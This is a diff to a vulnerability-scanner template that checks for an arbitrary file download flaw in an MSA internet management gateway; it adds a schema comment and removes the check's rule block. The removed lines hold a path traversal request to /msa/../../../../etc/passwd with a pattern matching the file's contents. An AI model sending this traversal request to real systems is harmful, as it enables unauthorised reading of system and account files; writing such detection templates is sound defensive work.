@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: msa-gateway-read-file
 
 info:
@@ -9,11 +10,3 @@ info:
     Fofa: 互联网管理网关
   reference:
     - http://wiki.peiqi.tech/wiki/iot/MSA/MSA%20%E4%BA%92%E8%81%94%E7%BD%91%E7%AE%A1%E7%90%86%E7%BD%91%E5%85%B3%20msa%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.html
-
-rules:
-  r0:
-    request:
-      method: GET
-      path: /msa/../../../../etc/passwd
-    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
-expression: r0()
